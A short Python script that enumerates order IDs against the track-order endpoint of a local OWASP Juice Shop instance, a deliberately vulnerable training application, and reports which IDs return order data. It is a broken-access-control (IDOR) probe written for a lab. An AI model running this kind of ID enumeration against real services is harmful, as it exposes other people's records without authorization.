import requests

# This Juice Shop API tracking endpoint does not require user login tokens
target_url = "http://localhost:3000/rest/track-order/"

print(f"[*] Commencing automated API parameter tampering scan on: {target_url}\n")

# Systematically fuzz order ID tracking numbers from 500 to 510
for order_id in range(500, 511):
    fuzzed_url = f"{target_url}{order_id}"
    try:
        response = requests.get(fuzzed_url)
        
        # HTTP 200 means the endpoint successfully returned database record data strings
        if response.status_code == 200:
            print(f"[!] POTENTIAL DATA LEAKAGE DETECTED: Order index ID {order_id} is wide open!")
            print(f"    --> URL: {fuzzed_url}\n")
        else:
            print(f"[-] Secure/No Data: Path {order_id} returned HTTP {response.status_code}")
            
    except requests.exceptions.ConnectionError:
        print("[!] Error: Connection failed. Ensure your OWASP Juice Shop Docker instance is running on port 3000.")
        break
    except Exception as e:
        print(f"[!] Unexpected processing block on ID {order_id}: {e}")
